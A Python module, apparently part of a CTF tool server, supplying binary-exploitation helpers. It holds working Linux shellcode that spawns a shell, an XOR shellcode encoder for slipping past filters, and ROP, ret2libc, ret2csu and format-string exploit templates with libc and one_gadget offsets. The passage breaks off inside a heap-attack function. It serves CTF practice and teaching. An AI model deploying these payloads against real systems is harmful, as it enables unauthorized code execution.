"""
Pwn Tools Module for CTF-MCP
Binary exploitation helpers: shellcode, patterns, ROP, format strings,
heap exploitation, stack pivot, and multi-architecture support
"""

import struct
from typing import Optional, List, Dict, Tuple, Union

from ..utils.security import dangerous_operation, RiskLevel
from ..utils.helpers import hex_to_bytes as _hex_to_bytes, clean_hex


def _compare_glibc_version(version: str, target: str) -> int:
    """
    Compare two glibc version strings.

    Returns:
        -1 if version < target
         0 if version == target
         1 if version > target
    """
    def parse_version(v: str) -> Tuple[int, ...]:
        """Parse version string like '2.31' or '2.32-0ubuntu3' to tuple of ints"""
        # Extract numeric part before any dash or other suffix
        v = v.split('-')[0].split('+')[0]
        parts = []
        for p in v.split('.'):
            try:
                parts.append(int(p))
            except ValueError:
                break
        return tuple(parts) if parts else (0,)

    v1 = parse_version(version)
    v2 = parse_version(target)

    # Pad shorter tuple with zeros
    max_len = max(len(v1), len(v2))
    v1 = v1 + (0,) * (max_len - len(v1))
    v2 = v2 + (0,) * (max_len - len(v2))

    if v1 < v2:
        return -1
    elif v1 > v2:
        return 1
    return 0


class PwnTools:
    """Binary exploitation tools for CTF challenges"""

    def get_tools(self) -> dict[str, str]:
        """Return available tools and their descriptions"""
        return {
            # Shellcode
            "shellcode_gen": "Generate shellcode for various architectures",
            "shellcode_encode": "Encode shellcode to avoid bad chars",
            # Patterns
            "pattern_create": "Create cyclic pattern for buffer overflow",
            "pattern_offset": "Find pattern offset",
            # ROP
            "rop_gadgets": "Common ROP gadgets for x64/x86/ARM/MIPS",
            "rop_chain_builder": "Build ROP chain template",
            "ret2libc": "Generate ret2libc exploit template",
            "ret2csu": "Generate ret2csu gadget chain",
            # Format String
            "format_string": "Format string exploit payload",
            "format_string_leak": "Format string memory leak helper",
            # Libc
            "libc_offset": "Calculate libc base from leak",
            "one_gadget": "Common one_gadget offsets",
            "libc_database": "Search libc by leaked addresses",
            # Heap Exploitation
            "heap_tcache": "Tcache poisoning techniques",
            "heap_fastbin": "Fastbin dup attack",
            "heap_house_of_force": "House of Force attack",
            "heap_house_of_spirit": "House of Spirit attack",
            "heap_unsorted_bin": "Unsorted bin attack",
            "heap_chunk_structure": "Heap chunk structure reference",
            # Stack
            "stack_pivot": "Stack pivot/migration techniques",
            "stack_layout": "Visualize stack layout",
            # Packing
            "pack": "Pack integer to bytes",
            "unpack": "Unpack bytes to integer",
            "flat": "Create flat payload from addresses",
            # Misc
            "got_plt": "GOT/PLT overwrite helper",
            "sigreturn": "SROP (Sigreturn-oriented programming)",
            "syscall_table": "Linux syscall reference",
        }

    # === Shellcode ===

    SHELLCODES = {
        "x64": {
            "linux": {
                "execve": (
                    "\\x48\\x31\\xf6"              # xor rsi, rsi
                    "\\x56"                        # push rsi
                    "\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68"  # movabs rdi, '/bin//sh'
                    "\\x57"                        # push rdi
                    "\\x54"                        # push rsp
                    "\\x5f"                        # pop rdi
                    "\\x48\\x31\\xd2"              # xor rdx, rdx
                    "\\x48\\xc7\\xc0\\x3b\\x00\\x00\\x00"  # mov rax, 59
                    "\\x0f\\x05"                   # syscall
                ),
                "read_flag": (
                    # open("flag.txt", 0)
                    "\\x48\\x31\\xc0"              # xor rax, rax
                    "\\x48\\x31\\xf6"              # xor rsi, rsi
                    "\\x48\\x31\\xd2"              # xor rdx, rdx
                    "\\x48\\xbb\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74"  # mov rbx, 'flag.txt'
                    "\\x53"                        # push rbx
                    "\\x48\\x89\\xe7"              # mov rdi, rsp
                    "\\xb0\\x02"                   # mov al, 2 (open)
                    "\\x0f\\x05"                   # syscall
                    # read(fd, buf, 100)
                    "\\x48\\x89\\xc7"              # mov rdi, rax
                    "\\x48\\x89\\xe6"              # mov rsi, rsp
                    "\\x48\\xc7\\xc2\\x64\\x00\\x00\\x00"  # mov rdx, 100
                    "\\x48\\x31\\xc0"              # xor rax, rax (read)
                    "\\x0f\\x05"                   # syscall
                    # write(1, buf, rax)
                    "\\x48\\x89\\xc2"              # mov rdx, rax
                    "\\x48\\xc7\\xc7\\x01\\x00\\x00\\x00"  # mov rdi, 1
                    "\\x48\\xc7\\xc0\\x01\\x00\\x00\\x00"  # mov rax, 1 (write)
                    "\\x0f\\x05"                   # syscall
                ),
            },
        },
        "x86": {
            "linux": {
                "execve": (
                    "\\x31\\xc0"                   # xor eax, eax
                    "\\x50"                        # push eax
                    "\\x68\\x2f\\x2f\\x73\\x68"    # push '//sh'
                    "\\x68\\x2f\\x62\\x69\\x6e"    # push '/bin'
                    "\\x89\\xe3"                   # mov ebx, esp
                    "\\x50"                        # push eax
                    "\\x53"                        # push ebx
                    "\\x89\\xe1"                   # mov ecx, esp
                    "\\x31\\xd2"                   # xor edx, edx
                    "\\xb0\\x0b"                   # mov al, 11
                    "\\xcd\\x80"                   # int 0x80
                ),
            },
        },
    }

    @dangerous_operation(
        risk_level=RiskLevel.CRITICAL,
        description="Generates executable shellcode for various architectures"
    )
    def shellcode_gen(self, arch: str = "x64", os: str = "linux", sc_type: str = "execve") -> str:
        """Generate shellcode for various architectures"""
        result = [f"Shellcode ({arch}/{os}/{sc_type}):", "-" * 50]

        if arch in self.SHELLCODES and os in self.SHELLCODES[arch]:
            if sc_type in self.SHELLCODES[arch][os]:
                shellcode = self.SHELLCODES[arch][os][sc_type]

                # Format as C string
                result.append(f"C string:\n{shellcode}")

                # Format as bytes
                raw_bytes = shellcode.replace("\\x", "")
                result.append(f"\nHex:\n{raw_bytes}")

                # Format as Python bytes
                result.append(f"\nPython:\nb'{shellcode}'")

                # Length
                byte_len = len(bytes.fromhex(raw_bytes))
                result.append(f"\nLength: {byte_len} bytes")

                # Null byte check
                if "00" in raw_bytes:
                    result.append("\n[!] Warning: Contains NULL bytes!")
                else:
                    result.append("\n[+] No NULL bytes")
            else:
                result.append(f"Unknown shellcode type. Available: {list(self.SHELLCODES[arch][os].keys())}")
        else:
            result.append(f"Architecture/OS not supported")
            result.append(f"Available: {list(self.SHELLCODES.keys())}")

        return '\n'.join(result)

    # === Cyclic Patterns ===

    def pattern_create(self, length: int = 100) -> str:
        """Create cyclic pattern for buffer overflow testing"""
        charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        charset2 = "abcdefghijklmnopqrstuvwxyz"
        charset3 = "0123456789"

        pattern = []
        for c1 in charset:
            for c2 in charset2:
                for c3 in charset3:
                    if len(pattern) >= length:
                        break
                    pattern.extend([c1, c2, c3])
                if len(pattern) >= length:
                    break
            if len(pattern) >= length:
                break

        pattern_str = ''.join(pattern[:length])

        result = [
            f"Cyclic Pattern (length={length}):",
            "-" * 50,
            pattern_str,
            "",
            f"As bytes: {pattern_str.encode()}",
            f"Hex: {pattern_str.encode().hex()}",
        ]

        return '\n'.join(result)

    def pattern_offset(self, value: str) -> str:
        """Find offset in cyclic pattern"""
        # Generate a large pattern
        charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        charset2 = "abcdefghijklmnopqrstuvwxyz"
        charset3 = "0123456789"

        pattern = []
        for c1 in charset:
            for c2 in charset2:
                for c3 in charset3:
                    pattern.extend([c1, c2, c3])

        pattern_str = ''.join(pattern)

        result = [f"Pattern Offset Search:", "-" * 50]

        # If hex value, try different endianness
        if value.startswith("0x") or all(c in "0123456789abcdefABCDEF" for c in value):
            hex_val = value.replace("0x", "")
            if len(hex_val) % 2:
                hex_val = "0" + hex_val

            # Little endian
            le_bytes = bytes.fromhex(hex_val)[::-1]
            try:
                le_str = le_bytes.decode('ascii')
                offset = pattern_str.find(le_str)
                if offset != -1:
                    result.append(f"[!] Found (little-endian): offset = {offset}")
            except (UnicodeDecodeError, ValueError):
                pass

            # Big endian
            be_bytes = bytes.fromhex(hex_val)
            try:
                be_str = be_bytes.decode('ascii')
                offset = pattern_str.find(be_str)
                if offset != -1:
                    result.append(f"[!] Found (big-endian): offset = {offset}")
            except (UnicodeDecodeError, ValueError):
                pass

        # String search
        offset = pattern_str.find(value)
        if offset != -1:
            result.append(f"[!] Found (string): offset = {offset}")
        else:
            result.append(f"[-] Pattern '{value}' not found")

        return '\n'.join(result)

    # === ROP Gadgets ===

    def rop_gadgets(self, arch: str = "x64", gadget_type: str = "all") -> str:
        """Common ROP gadget patterns"""
        gadgets = {
            "x64": {
                "pop_rdi": "pop rdi; ret  -> 0x5f c3",
                "pop_rsi": "pop rsi; ret  -> 0x5e c3",
                "pop_rdx": "pop rdx; ret  -> 0x5a c3",
                "pop_rax": "pop rax; ret  -> 0x58 c3",
                "pop_rbx": "pop rbx; ret  -> 0x5b c3",
                "pop_rcx": "pop rcx; ret  -> 0x59 c3",
                "pop_rsp": "pop rsp; ret  -> 0x5c c3",
                "pop_rbp": "pop rbp; ret  -> 0x5d c3",
                "syscall": "syscall; ret  -> 0x0f 05 c3",
                "ret": "ret           -> 0xc3",
                "leave_ret": "leave; ret    -> 0xc9 c3",
                "pop_rdi_rsi": "pop rdi; pop rsi; ret",
            },
            "x86": {
                "pop_eax": "pop eax; ret  -> 0x58 c3",
                "pop_ebx": "pop ebx; ret  -> 0x5b c3",
                "pop_ecx": "pop ecx; ret  -> 0x59 c3",
                "pop_edx": "pop edx; ret  -> 0x5a c3",
                "int_0x80": "int 0x80      -> 0xcd 80",
                "ret": "ret           -> 0xc3",
                "leave_ret": "leave; ret    -> 0xc9 c3",
            },
        }

        result = [f"ROP Gadgets ({arch}):", "-" * 50]

        if arch not in gadgets:
            return f"Unknown architecture. Available: {list(gadgets.keys())}"

        arch_gadgets = gadgets[arch]

        if gadget_type == "all":
            for name, gadget in arch_gadgets.items():
                result.append(f"  {name}: {gadget}")
        elif gadget_type in arch_gadgets:
            result.append(f"  {gadget_type}: {arch_gadgets[gadget_type]}")
        else:
            return f"Unknown gadget. Available: {list(arch_gadgets.keys())}"

        result.append("")
        result.append("Search with: ROPgadget --binary <file> --only 'pop|ret'")
        result.append("Or: ropper -f <file> --search 'pop rdi'")

        return '\n'.join(result)

    # === Format String ===

    def format_string(self, target_addr: str, value: str, offset: int, arch: str = "x64") -> str:
        """Generate format string exploit payload"""
        target = int(target_addr, 16)
        val = int(value, 16)

        result = [
            "Format String Exploit:",
            "-" * 50,
            f"Target address: {hex(target)}",
            f"Value to write: {hex(val)}",
            f"Offset: {offset}",
            f"Architecture: {arch}",
            "",
        ]

        ptr_size = 8 if arch == "x64" else 4

        # Split value into bytes for writing
        if arch == "x64":
            # Write 2 bytes at a time using %hn
            writes = []
            for i in range(4):
                byte_val = (val >> (i * 16)) & 0xFFFF
                addr = target + i * 2
                writes.append((addr, byte_val))

            result.append("Write plan (using %hn - 2 bytes each):")
            for addr, byte_val in writes:
                result.append(f"  {hex(addr)} <- {hex(byte_val)} ({byte_val})")

            result.append("")
            result.append("Payload template (Python):")
            result.append(f"""
# Format string payload generator
target = {hex(target)}
value = {hex(val)}
offset = {offset}

# Build payload
payload = b""
writes = []
for i in range(4):
    byte_val = (value >> (i * 16)) & 0xFFFF
    addr = target + i * 2
    writes.append((addr, byte_val))

# Sort by value for proper %n ordering
writes.sort(key=lambda x: x[1])

# Add addresses first
for addr, _ in writes:
    payload += struct.pack('<Q', addr)

# Add format specifiers
current = 0
for i, (_, val) in enumerate(writes):
    to_print = (val - current) % 0x10000
    if to_print > 0:
        payload += f"%{{to_print}}c".encode()
    payload += f"%{{{offset + i}}}$hn".encode()
    current = val

print(payload)
""")

        return '\n'.join(result)

    # === Libc ===

    LIBC_OFFSETS = {
        "2.31": {
            "puts": 0x84420,
            "printf": 0x64e10,
            "system": 0x55410,
            "execve": 0xe62f0,
            "/bin/sh": 0x1b45bd,
            "__libc_start_main": 0x26fc0,
        },
        "2.27": {
            "puts": 0x809c0,
            "printf": 0x64e80,
            "system": 0x4f440,
            "/bin/sh": 0x1b3e9a,
        },
        "2.23": {
            "puts": 0x6f690,
            "printf": 0x55800,
            "system": 0x45390,
            "/bin/sh": 0x18cd57,
        },
    }

    def libc_offset(self, leaked_addr: str, symbol: str, libc_version: str = "2.31") -> str:
        """Calculate libc base from leaked address"""
        leaked = int(leaked_addr, 16)

        result = [
            "Libc Base Calculation:",
            "-" * 50,
            f"Leaked address: {hex(leaked)}",
            f"Symbol: {symbol}",
            f"Libc version: {libc_version}",
            "",
        ]

        if libc_version in self.LIBC_OFFSETS:
            offsets = self.LIBC_OFFSETS[libc_version]
            if symbol in offsets:
                symbol_offset = offsets[symbol]
                libc_base = leaked - symbol_offset

                result.append(f"Symbol offset: {hex(symbol_offset)}")
                result.append(f"[!] Libc base: {hex(libc_base)}")
                result.append("")
                result.append("Other useful addresses:")
                for name, offset in offsets.items():
                    result.append(f"  {name}: {hex(libc_base + offset)}")
            else:
                result.append(f"Unknown symbol. Available: {list(offsets.keys())}")
        else:
            result.append(f"Unknown libc version. Available: {list(self.LIBC_OFFSETS.keys())}")
            result.append("")
            result.append("Use libc.rip or libc-database to find offsets")

        return '\n'.join(result)

    # === Packing/Unpacking ===

    def pack(self, value: int, bits: int = 64, endian: str = "little") -> str:
        """Pack integer to bytes"""
        fmt = {
            (32, "little"): "<I",
            (32, "big"): ">I",
            (64, "little"): "<Q",
            (64, "big"): ">Q",
        }

        if (bits, endian) not in fmt:
            return "Invalid bits/endian combination"

        packed = struct.pack(fmt[(bits, endian)], value)
        return f"Packed: {packed}\nHex: {packed.hex()}\nPython: {packed}"

    def unpack(self, data: str, bits: int = 64, endian: str = "little") -> str:
        """Unpack bytes to integer"""
        fmt = {
            (32, "little"): "<I",
            (32, "big"): ">I",
            (64, "little"): "<Q",
            (64, "big"): ">Q",
        }

        if (bits, endian) not in fmt:
            return "Invalid bits/endian combination"

        try:
            byte_data = _hex_to_bytes(data)
            value = struct.unpack(fmt[(bits, endian)], byte_data.ljust(bits // 8, b'\x00'))[0]
            return f"Unpacked: {value}\nHex: {hex(value)}"
        except Exception as e:
            return f"Unpack error: {e}"

    def flat(self, addresses: str, arch: str = "x64") -> str:
        """Create flat payload from addresses"""
        addr_list = [x.strip() for x in addresses.split(',')]
        ptr_size = 8 if arch == "x64" else 4
        fmt = "<Q" if arch == "x64" else "<I"

        result = ["Flat Payload Generator:", "-" * 50]
        result.append(f"Architecture: {arch}")
        result.append(f"Pointer size: {ptr_size} bytes")
        result.append("")

        payload_parts = []
        for addr in addr_list:
            try:
                if addr.startswith("0x"):
                    val = int(addr, 16)
                else:
                    val = int(addr)
                packed = struct.pack(fmt, val)
                payload_parts.append(packed)
                result.append(f"  {addr} -> {packed.hex()}")
            except Exception as e:
                result.append(f"  {addr} -> Error: {e}")

        if payload_parts:
            full_payload = b''.join(payload_parts)
            result.append("")
            result.append(f"Full payload ({len(full_payload)} bytes):")
            result.append(f"  Hex: {full_payload.hex()}")
            result.append(f"  Python: {full_payload}")

        return '\n'.join(result)

    # === Shellcode Encoding ===

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="Encodes shellcode to avoid detection and bypass filters"
    )
    def shellcode_encode(self, shellcode: str, bad_chars: str = "\\x00", encoder: str = "xor") -> str:
        """Encode shellcode to avoid bad characters"""
        result = ["Shellcode Encoder:", "-" * 50]

        # Parse shellcode
        try:
            sc_bytes = _hex_to_bytes(shellcode)
        except ValueError:
            return "Invalid shellcode format. Use hex (e.g., \\x48\\x31\\xc0)"

        # Parse bad chars
        bad_cleaned = clean_hex(bad_chars)
        bad_bytes = set(bytes.fromhex(bad_cleaned)) if bad_cleaned else set()

        result.append(f"Original length: {len(sc_bytes)} bytes")
        result.append(f"Bad characters: {[hex(b) for b in bad_bytes]}")
        result.append("")

        if encoder == "xor":
            # Find XOR key that avoids bad chars
            for key in range(1, 256):
                encoded = bytes(b ^ key for b in sc_bytes)
                if not (set(encoded) & bad_bytes) and key not in bad_bytes:
                    result.append(f"[+] XOR key found: 0x{key:02x}")
                    result.append(f"Encoded shellcode ({len(encoded)} bytes):")
                    result.append(f"  {encoded.hex()}")
                    result.append("")
                    result.append("Decoder stub (x64):")
                    result.append(f'''
    xor_key = 0x{key:02x}
    encoded = bytes.fromhex("{encoded.hex()}")

    # x64 XOR decoder stub
    decoder = (
        b"\\x48\\x31\\xc9"                    # xor rcx, rcx
        b"\\x48\\x81\\xc1" + struct.pack("<I", len(encoded)) +  # add rcx, len
        b"\\xeb\\x0b"                          # jmp short get_sc
        b"\\x5e"                               # pop rsi (shellcode addr)
        b"\\x80\\x36" + bytes([key]) +         # xor byte [rsi], key
        b"\\x48\\xff\\xc6"                     # inc rsi
        b"\\xe2\\xf8"                          # loop decode
        b"\\xeb\\x05"                          # jmp shellcode
        b"\\xe8\\xf0\\xff\\xff\\xff"           # call get_sc
    )
''')
                    return '\n'.join(result)

            result.append("[-] No single-byte XOR key found")

        elif encoder == "alpha":
            result.append("Alphanumeric encoding:")
            result.append("  Use msfvenom: msfvenom -p <payload> -e x86/alpha_mixed -f c")
            result.append("  Or pwntools: from pwn import *; print(asm(shellcraft.alphanumeric()))")

        elif encoder == "unicode":
            result.append("Unicode-safe encoding:")
            result.append("  Use msfvenom: msfvenom -p <payload> -e x86/unicode_mixed -f c")

        result.append("")
        result.append("Alternative encoders:")
        result.append("  - msfvenom -l encoders")
        result.append("  - shikata_ga_nai (polymorphic)")
        result.append("  - alpha_mixed (alphanumeric)")
        result.append("  - unicode_mixed (unicode safe)")

        return '\n'.join(result)

    # === ROP Chain Building ===

    @dangerous_operation(
        risk_level=RiskLevel.CRITICAL,
        description="Builds ROP chains for code execution"
    )
    def rop_chain_builder(self, target: str = "execve", arch: str = "x64") -> str:
        """Build ROP chain template for common targets"""
        result = ["ROP Chain Builder:", "-" * 50]
        result.append(f"Target: {target}")
        result.append(f"Architecture: {arch}")
        result.append("")

        chains = {
            "x64": {
                "execve": {
                    "description": "execve('/bin/sh', NULL, NULL)",
                    "registers": "rax=59, rdi='/bin/sh', rsi=0, rdx=0",
                    "template": '''
from pwn import *

# Find gadgets with: ROPgadget --binary <file> --ropchain
# Or: ropper -f <file> --chain execve

elf = ELF('./binary')
rop = ROP(elf)
libc = ELF('./libc.so.6')  # If using libc

# Example with known addresses
pop_rdi = 0x401234        # pop rdi; ret
pop_rsi = 0x401235        # pop rsi; ret
pop_rdx = 0x401236        # pop rdx; ret
pop_rax = 0x401237        # pop rax; ret
syscall_ret = 0x401238    # syscall; ret
bin_sh = 0x402000         # "/bin/sh" string address

# Build chain
payload = flat([
    pop_rdi, bin_sh,      # rdi = "/bin/sh"
    pop_rsi, 0,           # rsi = NULL
    pop_rdx, 0,           # rdx = NULL
    pop_rax, 59,          # rax = execve syscall number
    syscall_ret           # syscall
])
''',
                },
                "mprotect": {
                    "description": "mprotect(addr, size, PROT_RWX) - make memory executable",
                    "registers": "rax=10, rdi=addr, rsi=size, rdx=7",
                    "template": '''
# mprotect to make stack/heap executable, then jump to shellcode
pop_rdi = 0x401234
pop_rsi = 0x401235
pop_rdx = 0x401236
pop_rax = 0x401237
syscall_ret = 0x401238

stack_addr = 0x7fff0000 & ~0xfff  # Page-aligned
size = 0x1000

payload = flat([
    pop_rdi, stack_addr,
    pop_rsi, size,
    pop_rdx, 7,           # PROT_READ | PROT_WRITE | PROT_EXEC
    pop_rax, 10,          # mprotect syscall
    syscall_ret,
    stack_addr + 0x100    # Jump to shellcode
])
''',
                },
                "open_read_write": {
                    "description": "Open flag file, read it, write to stdout",
                    "template": '''
# Useful when execve is blocked (seccomp)
# open("flag.txt", 0) -> read(fd, buf, 100) -> write(1, buf, 100)

payload = flat([
    # open("flag.txt", 0)
    pop_rdi, flag_str_addr,
    pop_rsi, 0,           # O_RDONLY
    pop_rax, 2,           # open syscall
    syscall_ret,

    # read(3, buf, 100)  - assuming fd=3
    pop_rdi, 3,
    pop_rsi, buf_addr,
    pop_rdx, 100,
    pop_rax, 0,           # read syscall
    syscall_ret,

    # write(1, buf, 100)
    pop_rdi, 1,
    pop_rsi, buf_addr,
    pop_rdx, 100,
    pop_rax, 1,           # write syscall
    syscall_ret,
])
''',
                },
            },
            "x86": {
                "execve": {
                    "description": "execve('/bin/sh', NULL, NULL)",
                    "registers": "eax=11, ebx='/bin/sh', ecx=0, edx=0",
                    "template": '''
# x86 uses int 0x80 for syscalls
pop_eax = 0x08041234
pop_ebx = 0x08041235
pop_ecx = 0x08041236
pop_edx = 0x08041237
int_80 = 0x08041238       # int 0x80; ret

bin_sh = 0x08042000

payload = flat([
    pop_ebx, bin_sh,      # ebx = "/bin/sh"
    pop_ecx, 0,           # ecx = NULL
    pop_edx, 0,           # edx = NULL
    pop_eax, 11,          # eax = execve
    int_80
], word_size=32)
''',
                },
            },
        }

        if arch in chains and target in chains[arch]:
            chain_info = chains[arch][target]
            result.append(f"Description: {chain_info['description']}")
            if 'registers' in chain_info:
                result.append(f"Registers: {chain_info['registers']}")
            result.append("")
            result.append("Template:")
            result.append(chain_info['template'])
        else:
            result.append(f"No template for {target} on {arch}")
            result.append(f"Available targets for {arch}: {list(chains.get(arch, {}).keys())}")

        result.append("")
        result.append("Gadget finding tools:")
        result.append("  ROPgadget --binary <file> --ropchain")
        result.append("  ropper -f <file> --chain execve")
        result.append("  pwntools: ROP(elf).find_gadget(['pop rdi', 'ret'])")

        return '\n'.join(result)

    @dangerous_operation(
        risk_level=RiskLevel.CRITICAL,
        description="ret2libc exploitation technique for code execution"
    )
    def ret2libc(self, libc_base: str = None, arch: str = "x64") -> str:
        """Generate ret2libc exploit template"""
        result = ["ret2libc Exploit Template:", "-" * 50]
        result.append(f"Architecture: {arch}")
        result.append("")

        result.append('''
from pwn import *

# Setup
binary = './vuln'
elf = ELF(binary)
libc = ELF('./libc.so.6')  # Use correct libc version

# Find libc version:
#   - strings libc.so.6 | grep "GNU C Library"
#   - libc.rip or libc-database

# 1. Leak libc address (e.g., via format string or puts GOT)
# Example: Use puts to leak puts@GOT
''')

        if arch == "x64":
            result.append('''
# x64 ret2libc
pop_rdi = elf.search(asm('pop rdi; ret')).__next__()
ret = elf.search(asm('ret')).__next__()  # For stack alignment

# Stage 1: Leak libc
payload1 = flat([
    b'A' * offset,        # Padding to return address
    pop_rdi,
    elf.got['puts'],      # Leak puts@GOT
    elf.plt['puts'],      # Call puts
    elf.symbols['main']   # Return to main for stage 2
])

io.sendline(payload1)
leaked = u64(io.recvline().strip().ljust(8, b'\\x00'))
libc.address = leaked - libc.symbols['puts']
log.info(f"Libc base: {hex(libc.address)}")

# Stage 2: Call system("/bin/sh")
payload2 = flat([
    b'A' * offset,
    ret,                  # Stack alignment (Ubuntu 18.04+)
    pop_rdi,
    next(libc.search(b'/bin/sh\\x00')),
    libc.symbols['system']
])

io.sendline(payload2)
io.interactive()
''')
        else:
            result.append('''
# x86 ret2libc (arguments on stack)
payload = flat([
    b'A' * offset,
    libc.symbols['system'],
    0xdeadbeef,           # Fake return address
    next(libc.search(b'/bin/sh\\x00'))
], word_size=32)
''')

        result.append("")
        result.append("Common libc offsets (2.31):")
        result.append("  system:  0x55410")
        result.append("  /bin/sh: 0x1b45bd")
        result.append("  puts:    0x84420")

        return '\n'.join(result)

    @dangerous_operation(
        risk_level=RiskLevel.CRITICAL,
        description="ret2csu universal gadget exploitation"
    )
    def ret2csu(self, arch: str = "x64") -> str:
        """Generate ret2csu gadget chain (universal gadget)"""
        result = ["ret2csu (Universal Gadget):", "-" * 50]
        result.append("")
        result.append("ret2csu uses gadgets in __libc_csu_init to control")
        result.append("rdx, rsi, rdi and call arbitrary functions.")
        result.append("")

        result.append('''
# __libc_csu_init gadgets (present in most binaries)
#
# Gadget 1 (csu_pop):
#   pop rbx
#   pop rbp
#   pop r12
#   pop r13
#   pop r14
#   pop r15
#   ret
#
# Gadget 2 (csu_call):
#   mov rdx, r14
#   mov rsi, r13
#   mov edi, r12d
#   call qword ptr [r15 + rbx*8]
#   add rbx, 1
#   cmp rbp, rbx
#   jne <loop>
#   ... (falls through to csu_pop)

from pwn import *

elf = ELF('./binary')

# Find gadgets
csu_pop = 0x40129a    # Adjust based on binary
csu_call = 0x401280   # Adjust based on binary

def ret2csu(func_ptr, arg1, arg2, arg3, next_addr):
    """
    func_ptr: Address of pointer to function (e.g., GOT entry)
    arg1, arg2, arg3: Arguments (note: arg1 is only 32-bit!)
    """
    payload = flat([
        csu_pop,
        0,              # rbx = 0
        1,              # rbp = 1 (rbx + 1, to pass comparison)
        arg1,           # r12 -> edi (32-bit!)
        arg2,           # r13 -> rsi
        arg3,           # r14 -> rdx
        func_ptr,       # r15 (will call [r15 + rbx*8] = [func_ptr])
        csu_call,
        # After call, falls through to csu_pop again
        0, 0, 0, 0, 0, 0, 0,  # Padding for 7 pops
        next_addr       # Return address
    ])
    return payload

# Example: call write(1, buf, len) via write@GOT
payload = ret2csu(
    elf.got['write'],   # Pointer to write
    1,                  # fd = stdout
    buf_addr,           # buffer
    0x100,              # length
    elf.symbols['main'] # Return to main
)
''')

        result.append("")
        result.append("Limitations:")
        result.append("  - First argument (rdi) is only 32-bit (edi)")
        result.append("  - Need pointer to function, not function address directly")
        result.append("  - Can chain multiple ret2csu calls")

        return '\n'.join(result)

    # === Format String ===

    def format_string_leak(self, offset: int = 6, count: int = 20, arch: str = "x64") -> str:
        """Format string memory leak helper"""
        result = ["Format String Memory Leak:", "-" * 50]
        result.append(f"Starting offset: {offset}")
        result.append(f"Architecture: {arch}")
        result.append("")

        # Generate leak payloads
        result.append("Stack leak payloads:")
        for i in range(count):
            result.append(f"  %{offset + i}$p  (offset {offset + i})")

        result.append("")
        result.append("Useful format specifiers:")
        result.append("  %p    - Pointer (hex)")
        result.append("  %s    - String at address")
        result.append("  %x    - Hex (32-bit)")
        result.append("  %lx   - Hex (64-bit)")
        result.append("  %n    - Write number of chars printed")
        result.append("  %hn   - Write as short (2 bytes)")
        result.append("  %hhn  - Write as byte (1 byte)")

        result.append("")
        result.append("Finding offset:")
        result.append("  Send: AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p")
        result.append("  Look for: 0x4141414141414141")

        result.append("")
        result.append("Python helper:")
        result.append('''
from pwn import *

def leak_stack(io, offset, count=20):
    """Leak multiple stack values"""
    leaks = []
    for i in range(count):
        io.sendline(f'%{offset + i}$p'.encode())
        try:
            leak = int(io.recvline().strip(), 16)
            leaks.append(leak)
            print(f"Offset {offset + i}: {hex(leak)}")
        except (ValueError, AttributeError):
            pass
    return leaks

def find_offset(io, marker=b'AAAAAAAA'):
    """Find format string offset automatically"""
    payload = marker + b'.%p' * 50
    io.sendline(payload)
    response = io.recvline()
    parts = response.split(b'.')
    target = hex(u64(marker))[2:]
    for i, part in enumerate(parts[1:], 1):
        if target in part.decode():
            return i
    return None
''')

        return '\n'.join(result)

    # === Libc Helpers ===

    def one_gadget(self, libc_version: str = "2.31") -> str:
        """Common one_gadget offsets for RCE"""
        result = ["One Gadget (execve) Offsets:", "-" * 50]
        result.append(f"Libc version: {libc_version}")
        result.append("")

        one_gadgets = {
            "2.31": {
                "ubuntu20.04_x64": [
                    ("0xe6c7e", "constraints: [rsp+0x70] == NULL"),
                    ("0xe6c81", "constraints: [rsp+0x78] == NULL"),
                    ("0xe6c84", "constraints: [rsp+0x78] == NULL"),
                ],
            },
            "2.27": {
                "ubuntu18.04_x64": [
                    ("0x4f3d5", "constraints: rsp & 0xf == 0, rcx == NULL"),
                    ("0x4f432", "constraints: rsp & 0xf == 0, rcx == NULL"),
                    ("0x10a41c", "constraints: rsp & 0xf == 0, [rsp+0x40] == NULL"),
                ],
            },
            "2.23": {
                "ubuntu16.04_x64": [
                    ("0x45226", "constraints: rax == NULL"),
                    ("0x4527a", "constraints: rax == NULL"),
                    ("0xf0364", "constraints: [rsp+0x40] == NULL"),
                    ("0xf1207", "constraints: [rsp+0x70] == NULL"),
                ],
            },
        }

        if libc_version in one_gadgets:
            for distro, gadgets in one_gadgets[libc_version].items():
                result.append(f"\n{distro}:")
                for offset, constraint in gadgets:
                    result.append(f"  {offset}: {constraint}")
        else:
            result.append(f"No one_gadget data for version {libc_version}")
            result.append(f"Available: {list(one_gadgets.keys())}")

        result.append("")
        result.append("Find one_gadgets:")
        result.append("  one_gadget ./libc.so.6")
        result.append("  one_gadget -l 2 ./libc.so.6  # More constraints")
        result.append("")
        result.append("Usage:")
        result.append("  libc_base + one_gadget_offset -> RCE")
        result.append("  Often used to overwrite __malloc_hook or __free_hook")

        return '\n'.join(result)

    def libc_database(self, symbol: str, address: str) -> str:
        """Search libc by leaked symbol address"""
        result = ["Libc Database Search:", "-" * 50]
        result.append(f"Symbol: {symbol}")
        result.append(f"Address: {address}")
        result.append("")

        addr = int(address, 16) if address.startswith("0x") else int(address)
        last_3_nibbles = addr & 0xFFF

        result.append(f"Last 3 hex digits: {hex(last_3_nibbles)}")
        result.append("")
        result.append("Online resources:")
        result.append(f"  - https://libc.rip/")
        result.append(f"  - https://libc.blukat.me/")
        result.append(f"  - https://libc.nullbyte.cat/")
        result.append("")
        result.append("Local search with libc-database:")
        result.append(f"  ./find {symbol} {hex(last_3_nibbles)}")
        result.append(f"  ./identify libc.so.6")
        result.append(f"  ./dump libc_id {symbol}")
        result.append("")
        result.append("pwntools LibcSearcher:")
        result.append(f'''
from LibcSearcher import *

libc = LibcSearcher("{symbol}", {hex(addr)})
libc_base = {hex(addr)} - libc.dump("{symbol}")
system_addr = libc_base + libc.dump("system")
binsh_addr = libc_base + libc.dump("str_bin_sh")
''')

        return '\n'.join(result)

    # === Heap Exploitation ===

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="Tcache poisoning heap exploitation technique"
    )
    def heap_tcache(self, libc_version: str = "2.31") -> str:
        """Tcache poisoning techniques"""
        result = ["Tcache Poisoning Attack:", "-" * 50]
        result.append(f"Libc version: {libc_version}")
        result.append("")

